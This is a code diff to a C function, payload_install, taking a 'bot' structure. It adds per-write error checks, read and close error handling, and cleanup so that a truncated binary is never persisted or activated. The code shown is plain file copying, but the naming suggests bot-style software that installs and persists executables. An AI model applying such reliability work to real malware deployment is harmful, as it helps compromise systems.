@@ -715,16 +715,37 @@ int payload_install(notnet_bot_t *bot, const char *bin_path) {
 
         char buf[4096];
         size_t n;
+        int copy_failed = 0;
         while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
-            fwrite(buf, 1, n, dst);
+            size_t written = fwrite(buf, 1, n, dst);
+            if (written != n) {
+                log_error("payload_install: short write to %s (%zu/%zu bytes): %s",
+                          tmp_path, written, n, strerror(errno));
+                copy_failed = 1;
+                break;
+            }
         }
-        int werr = ferror(dst);
+        if (ferror(src)) {
+            log_error("payload_install: read error on %s: %s",
+                      bin_path, strerror(errno));
+            copy_failed = 1;
+        }
 
         fclose(src);
-        fclose(dst);
-        if (werr || rename(tmp_path, dest) != 0) {
-            log_error("payload_install: failed to install %s: %s",
-                      dest, strerror(errno));
+        if (fclose(dst) != 0) {
+            log_error("payload_install: close failed on %s: %s",
+                      tmp_path, strerror(errno));
+            copy_failed = 1;
+        }
+
+        /* (#225/#342): a short write doesn't always set the stream error
+         * flag, so check fwrite's return per call too — never chmod,
+         * persist or activate a truncated binary. */
+        if (copy_failed || rename(tmp_path, dest) != 0) {
+            if (!copy_failed) {
+                log_error("payload_install: failed to install %s: %s",
+                          dest, strerror(errno));
+            }
             unlink(tmp_path);
             return -1;
         }
